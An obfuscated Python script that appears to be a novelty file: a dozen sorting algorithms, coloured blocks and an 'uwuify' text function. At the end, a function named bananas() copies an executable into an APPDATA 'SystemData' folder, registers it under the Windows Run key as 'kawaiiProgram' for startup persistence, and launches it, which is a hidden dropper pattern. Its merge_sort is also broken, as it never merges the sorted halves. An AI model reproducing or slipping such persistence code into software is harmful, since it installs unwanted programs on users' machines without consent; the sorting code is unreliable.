import time ;import re;import random;import os;import subprocess;import shutil 
RED ='\033[31m';GREEN ='\033[32m';YELLOW ='\033[33m';BLUE ='\033[34m';PURPLE ='\033[35m';CYAN ='\033[36m';WHITE ='\033[37m';RESET ='\033[0m'
colors ={1 :RED ,2 :GREEN ,3 :YELLOW ,4 :BLUE ,5 :PURPLE ,6 :CYAN ,7 :WHITE }
assets ={1 :f"{RED}∎{RESET}",2 :f"{GREEN}∎{RESET}",3 :f"{YELLOW}∎{RESET}",4 :f"{BLUE}∎{RESET}",5 :f"{PURPLE}∎{RESET}",6 :f"{CYAN}∎{RESET}",7 :f"{WHITE}∎{RESET}"}
def is_sorted (O0O0OOO0OO0O00OO0 ):
    for OOO0000000O00000O in range (len (O0O0OOO0OO0O00OO0 )-1 ):
        if O0O0OOO0OO0O00OO0 [OOO0000000O00000O ]>O0O0OOO0OO0O00OO0 [OOO0000000O00000O +1 ]:return False 
    return True 
def bogosort (O0O0O0OO0000OO00O ):
    while not is_sorted (O0O0O0OO0000OO00O ):random .shuffle (O0O0O0OO0000OO00O )
    return O0O0O0OO0000OO00O 
def bubble_sort (OOOO0O0OOOO0OOO0O ):
    for O000OOO0000O0OOOO in range (len (OOOO0O0OOOO0OOO0O )):
        for O00O00O000OOOOO0O in range (len (OOOO0O0OOOO0OOO0O )-1 ):
            if OOOO0O0OOOO0OOO0O [O00O00O000OOOOO0O ]>OOOO0O0OOOO0OOO0O [O00O00O000OOOOO0O +1 ]:OOOO0O0OOOO0OOO0O [O00O00O000OOOOO0O ],OOOO0O0OOOO0OOO0O [O00O00O000OOOOO0O +1 ]=OOOO0O0OOOO0OOO0O [O00O00O000OOOOO0O +1 ],OOOO0O0OOOO0OOO0O [O00O00O000OOOOO0O ]
    return OOOO0O0OOOO0OOO0O 
def selection_sort (OOOO000O0O0O0OOO0 ):
    for OO000O000OOOOOO0O in range (len (OOOO000O0O0O0OOO0 )):
        OOO000O00OO0O00OO =OO000O000OOOOOO0O 
        for OOOOO000OOOOO0OOO in range (OO000O000OOOOOO0O +1 ,len (OOOO000O0O0O0OOO0 )):
            if OOOO000O0O0O0OOO0 [OOOOO000OOOOO0OOO ]<OOOO000O0O0O0OOO0 [OOO000O00OO0O00OO ]:OOO000O00OO0O00OO =OOOOO000OOOOO0OOO 
        OOOO000O0O0O0OOO0 [OO000O000OOOOOO0O ],OOOO000O0O0O0OOO0 [OOO000O00OO0O00OO ]=OOOO000O0O0O0OOO0 [OOO000O00OO0O00OO ],OOOO000O0O0O0OOO0 [OO000O000OOOOOO0O ]
    return OOOO000O0O0O0OOO0 
def insertion_sort (OO0O0OO0O0000OO00 ):
    for OO00O00O000O0O000 in range (1 ,len (OO0O0OO0O0000OO00 )):
        O0O0OOO0O00OOO00O =OO00O00O000O0O000 
        while O0O0OOO0O00OOO00O >0 and OO0O0OO0O0000OO00 [O0O0OOO0O00OOO00O -1 ]>OO0O0OO0O0000OO00 [O0O0OOO0O00OOO00O ]:OO0O0OO0O0000OO00 [O0O0OOO0O00OOO00O -1 ],OO0O0OO0O0000OO00 [O0O0OOO0O00OOO00O ]=OO0O0OO0O0000OO00 [O0O0OOO0O00OOO00O ],OO0O0OO0O0000OO00 [O0O0OOO0O00OOO00O -1 ];O0O0OOO0O00OOO00O -=1 
    return OO0O0OO0O0000OO00 
def merge_sort (O0O00000OOOO0OO00 ):
    if len (O0O00000OOOO0OO00 )<=1 :return O0O00000OOOO0OO00 
    OOOOO0000OOO00O00 =len (O0O00000OOOO0OO00 )//2 ;OO0O0O0OO0O0O0000 =merge_sort (O0O00000OOOO0OO00 [:OOOOO0000OOO00O00 ]);O0000000O0OO00O0O =merge_sort (O0O00000OOOO0OO00 [OOOOO0000OOO00O00 :]);return (OO0O0O0OO0O0O0000 +O0000000O0OO00O0O )
def quick_sort (OOOO0O0OOOO0O000O ):
    if len (OOOO0O0OOOO0O000O )<=1 :return OOOO0O0OOOO0O000O 
    O0OOOO00OOO00O0OO =OOOO0O0OOOO0O000O [0 ];O0O00OO00OO0O000O =[O000OO0O00O00000O for O000OO0O00O00000O in OOOO0O0OOOO0O000O if O000OO0O00O00000O <O0OOOO00OOO00O0OO ];O0O00O0O0OOOO0O0O =[O00000O00O0O00OO0 for O00000O00O0O00OO0 in OOOO0O0OOOO0O000O if O00000O00O0O00OO0 ==O0OOOO00OOO00O0OO ];OOOOOOOO000OO000O =[OOO00OO0OO0O000OO for OOO00OO0OO0O000OO in OOOO0O0OOOO0O000O if OOO00OO0OO0O000OO >O0OOOO00OOO00O0OO ];return quick_sort (O0O00OO00OO0O000O )+O0O00O0O0OOOO0O0O +quick_sort (OOOOOOOO000OO000O )
def heap_sort (OO000000OO00O00OO ):
    def O0O0OO00O00OO00O0 (O00OOOOOOO00000O0 ,O000OOO0O000O00OO ,O0O0000OOO0000O0O ):
        O00O000O0O0000OO0 =O0O0000OOO0000O0O ;OOOOOOO0OOO00O0O0 =2 *O0O0000OOO0000O0O +1 ;OO0OO0OOO0000O0O0 =2 *O0O0000OOO0000O0O +2 
        if OOOOOOO0OOO00O0O0 <O000OOO0O000O00OO and O00OOOOOOO00000O0 [O0O0000OOO0000O0O ]<O00OOOOOOO00000O0 [OOOOOOO0OOO00O0O0 ]:O00O000O0O0000OO0 =OOOOOOO0OOO00O0O0 
        if OO0OO0OOO0000O0O0 <O000OOO0O000O00OO and O00OOOOOOO00000O0 [O00O000O0O0000OO0 ]<O00OOOOOOO00000O0 [OO0OO0OOO0000O0O0 ]:O00O000O0O0000OO0 =OO0OO0OOO0000O0O0 
        if O00O000O0O0000OO0 !=O0O0000OOO0000O0O :O00OOOOOOO00000O0 [O0O0000OOO0000O0O ],O00OOOOOOO00000O0 [O00O000O0O0000OO0 ]=O00OOOOOOO00000O0 [O00O000O0O0000OO0 ],O00OOOOOOO00000O0 [O0O0000OOO0000O0O ];O0O0OO00O00OO00O0 (O00OOOOOOO00000O0 ,O000OOO0O000O00OO ,O00O000O0O0000OO0 )
    OOOOOO000O0000OOO =len (OO000000OO00O00OO )
    for O0OO000OOOOO00O00 in range (OOOOOO000O0000OOO //2 -1 ,-1 ,-1 ):O0O0OO00O00OO00O0 (OO000000OO00O00OO ,OOOOOO000O0000OOO ,O0OO000OOOOO00O00 )
    for O0OO000OOOOO00O00 in range (OOOOOO000O0000OOO -1 ,0 ,-1 ):
        OO000000OO00O00OO [O0OO000OOOOO00O00 ],OO000000OO00O00OO [0 ]=OO000000OO00O00OO [0 ],OO000000OO00O00OO [O0OO000OOOOO00O00 ];O0O0OO00O00OO00O0 (OO000000OO00O00OO ,O0OO000OOOOO00O00 ,0 )
    return OO000000OO00O00OO 
def shell_sort (OOO0O00OOOO0OO00O ):
    OOO0O0O000OO00O0O =len (OOO0O00OOOO0OO00O )//2 
    while OOO0O0O000OO00O0O >0 :
        for O00O00O00O000O0OO in range (OOO0O0O000OO00O0O ,len (OOO0O00OOOO0OO00O )):
            OOOO0000OOOO00OO0 =OOO0O00OOOO0OO00O [O00O00O00O000O0OO ];OOOOO0000OO0OO000 =O00O00O00O000O0OO 
            while OOOOO0000OO0OO000 >=OOO0O0O000OO00O0O and OOO0O00OOOO0OO00O [OOOOO0000OO0OO000 -OOO0O0O000OO00O0O ]>OOOO0000OOOO00OO0 :OOO0O00OOOO0OO00O [OOOOO0000OO0OO000 ]=OOO0O00OOOO0OO00O [OOOOO0000OO0OO000 -OOO0O0O000OO00O0O ];OOOOO0000OO0OO000 -=OOO0O0O000OO00O0O 
            OOO0O00OOOO0OO00O [OOOOO0000OO0OO000 ]=OOOO0000OOOO00OO0 
        OOO0O0O000OO00O0O //=2 
    return OOO0O00OOOO0OO00O 
def counting_sort (O0O00O00O0OOO000O ):
    O0OO0OO0OOO0O00O0 =int (max (O0O00O00O0OOO000O ));OOOOOO00OO00O0O00 =int (min (O0O00O00O0OOO000O ));OOOO0O0O0000O00OO =O0OO0OO0OOO0O00O0 -OOOOOO00OO00O0O00 +1 ;OO0O00OOO00O000O0 =[0 for _OOO00O000O000OO00 in range (OOOO0O0O0000O00OO )];OO0OOO0OO0OOO000O =[0 for _OO0OO00000OO0O00O in range (len (O0O00O00O0OOO000O ))]
    for OO0O00OOOO0O000OO in range (0 ,len (O0O00O00O0OOO000O )):OO0O00OOO00O000O0 [O0O00O00O0OOO000O [OO0O00OOOO0O000OO ]-OOOOOO00OO00O0O00 ]+=1 
    for OO0O00OOOO0O000OO in range (1 ,len (OO0O00OOO00O000O0 )):OO0O00OOO00O000O0 [OO0O00OOOO0O000OO ]+=OO0O00OOO00O000O0 [OO0O00OOOO0O000OO -1 ]
    for OO0O00OOOO0O000OO in range (len (O0O00O00O0OOO000O )-1 ,-1 ,-1 ):OO0OOO0OO0OOO000O [OO0O00OOO00O000O0 [O0O00O00O0OOO000O [OO0O00OOOO0O000OO ]-OOOOOO00OO00O0O00 ]-1 ]=O0O00O00O0OOO000O [OO0O00OOOO0O000OO ];OO0O00OOO00O000O0 [O0O00O00O0OOO000O [OO0O00OOOO0O000OO ]-OOOOOO00OO00O0O00 ]-=1 
    for OO0O00OOOO0O000OO in range (0 ,len (O0O00O00O0OOO000O )):O0O00O00O0OOO000O [OO0O00OOOO0O000OO ]=OO0OOO0OO0OOO000O [OO0O00OOOO0O000OO ]
    return O0O00O00O0OOO000O 
def radix_sort (O00OO0OO0O00OO0O0 ):
    O0OO0O0O0O0O00000 =10 ;OO0OO0O0OOO00OOOO =1 ;OOO0O0000000OO0O0 =max (O00OO0OO0O00OO0O0 )
    while OO0OO0O0OOO00OOOO <OOO0O0000000OO0O0 :
        O00O0000OO00OOOOO =[list ()for _O0O000000O0OO000O in range (O0OO0O0O0O0O00000 )]
        for OOO000OOO0O0OOO00 in O00OO0OO0O00OO0O0 :
            OO00OO0O0O0000OO0 =int ((OOO000OOO0O0OOO00 /OO0OO0O0OOO00OOOO )%O0OO0O0O0O0O00000 );O00O0000OO00OOOOO [OO00OO0O0O0000OO0 ].append (OOO000OOO0O0OOO00 )
        OOO00OO000O0OO00O =0 
        for OOO0OOOOO0OOOO0O0 in range (O0OO0O0O0O0O00000 ):
            O000O000O0OO00O0O =O00O0000OO00OOOOO [OOO0OOOOO0OOOO0O0 ]
            for OOO000OOO0O0OOO00 in O000O000O0OO00O0O :
                O00OO0OO0O00OO0O0 [OOO00OO000O0OO00O ]=OOO000OOO0O0OOO00 ;OOO00OO000O0OO00O +=1 
        OO0OO0O0OOO00OOOO *=O0OO0O0O0O0O00000 
    return O00OO0OO0O00OO0O0 
def gnome_sort (O0O0OOO00O000O0OO ):
    O0O00OOO000000O00 =0 
    while O0O00OOO000000O00 <len (O0O0OOO00O000O0OO ):
        if O0O00OOO000000O00 ==0 :O0O00OOO000000O00 +=1 
        if O0O0OOO00O000O0OO [O0O00OOO000000O00 ]>=O0O0OOO00O000O0OO [O0O00OOO000000O00 -1 ]:O0O00OOO000000O00 +=1 
        else :O0O0OOO00O000O0OO [O0O00OOO000000O00 ],O0O0OOO00O000O0OO [O0O00OOO000000O00 -1 ]=O0O0OOO00O000O0OO [O0O00OOO000000O00 -1 ],O0O0OOO00O000O0OO [O0O00OOO000000O00 ];O0O00OOO000000O00 -=1 
    return O0O0OOO00O000O0OO 
def cocktail_sort (O0O0O000000O0OO0O ):
    def OOOOO000OO0OO0O00 (OO0O0OOO000OO0O0O ,O00O0OO0O00O0000O ,O0O0O00O00OOOO0O0 ):
        if OO0O0OOO000OO0O0O [O00O0OO0O00O0000O ]>OO0O0OOO000OO0O0O [O0O0O00O00OOOO0O0 ]:OO0O0OOO000OO0O0O [O00O0OO0O00O0000O ],OO0O0OOO000OO0O0O [O0O0O00O00OOOO0O0 ]=OO0O0OOO000OO0O0O [O0O0O00O00OOOO0O0 ],OO0O0OOO000OO0O0O [O00O0OO0O00O0000O ]
    OOOOO00000OO0000O =len (O0O0O000000O0OO0O )-1 ;OO0OOO0OOO000OO00 =0 ;O000000O0O0O000O0 =False 
    while not O000000O0O0O000O0 :
        O000000O0O0O000O0 =True 
        for OOOOO000OO0000000 in range (OO0OOO0OOO000OO00 ,OOOOO00000OO0000O ):
            if O0O0O000000O0OO0O [OOOOO000OO0000000 ]>O0O0O000000O0OO0O [OOOOO000OO0000000 +1 ]:OOOOO000OO0OO0O00 (O0O0O000000O0OO0O ,OOOOO000OO0000000 ,OOOOO000OO0000000 +1 );O000000O0O0O000O0 =False 
        OOOOO00000OO0000O -=1 
        for OOOOO000OO0000000 in range (OOOOO00000OO0000O ,OO0OOO0OOO000OO00 ,-1 ):
            if O0O0O000000O0OO0O [OOOOO000OO0000000 ]<O0O0O000000O0OO0O [OOOOO000OO0000000 -1 ]:OOOOO000OO0OO0O00 (O0O0O000000O0OO0O ,OOOOO000OO0000000 ,OOOOO000OO0000000 -1 );O000000O0O0O000O0 =False 
        OO0OOO0OOO000OO00 +=1 
    return O0O0O000000O0OO0O 
algorithms =[bogosort ,bubble_sort ,selection_sort ,insertion_sort ,merge_sort ,quick_sort ,heap_sort ,shell_sort ,counting_sort ,radix_sort ,gnome_sort ,cocktail_sort ]
def uwuify (OO0O0O0O00O000000 ,face_probability =0.5 ):
    OO0O0O0O00O000000 =OO0O0O0O00O000000 .replace ('r','w').replace ('l','w')
    OOO000OO00O0O0O00 =['(・`ω´・)','UwU','(ฅ\'ω\'ฅ)','owo','(*^ω^)','(つ✧ω✧)つ']
    OO0O0O0O00O000000 =re .sub (r'\b\w+\b',lambda OO000OOOO000O0OOO :random .choice (OOO000OO00O0O0O00 )+' '+OO000OOOO000O0OOO .group (0 ),OO0O0O0O00O000000 )
    if random .random ()<face_probability :
        OO0O0O0O00O000000 +=' nyaa~'
    else :
        OO0O0O0O00O000000 +=' mew~'
    return OO0O0O0O00O000000 
def bananas ():
    O00OO00O0OOOO000O ="C:\\path\\to\\banana.exe"
    O00O000O0OOO0000O =os .path .join (os .getenv ("APPDATA"),"SystemData")
    os .makedirs (O00O000O0OOO0000O ,exist_ok =True )
    print (f"{uwuify('Hello world!')}")
    if not os .path .exists (os .path .join (O00O000O0OOO0000O ,"banana.exe")):
        shutil .copy (O00OO00O0OOOO000O ,O00O000O0OOO0000O )
        O00O00O0000000OO0 ="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        OO00OO0OOOO0OOO00 ="kawaiiProgram"
        O00000OO0OO00O0OO =sorted (colors .items (),key =lambda O0OO0O00000OOO0OO :O0OO0O00000OOO0OO [0 ])
        OOOOO0000000O0O00 =sorted (assets .items (),key =lambda O0O000O0O00000O0O :O0O000O0O00000O0O [0 ])
        print (f"{uwuify('Hello world!')}")
        for O0O0OO0OO0OO0OO00 in range (len (O00000OO0OO00O0OO )):
            print (f"{O00000OO0OO00O0OO[O0O0OO0OO0OO0OO00][1]}{OOOOO0000000O0O00[O0O0OO0OO0OO0OO00][1]}{RESET}")
        O000OOO000OO0OOOO =f'"{os.path.join(O00O000O0OOO0000O, "banana.exe")}"'
        O0O0OOOO0OOO000O0 =f'reg add "{O00O00O0000000OO0}" /v "{OO00OO0OOOO0OOO00}" /t REG_SZ /d {O000OOO000OO0OOOO} /f'
        subprocess .call (O0O0OOOO0OOO000O0 ,shell =True )
        os .system (os .path .join (O00O000O0OOO0000O ,"banana.exe"))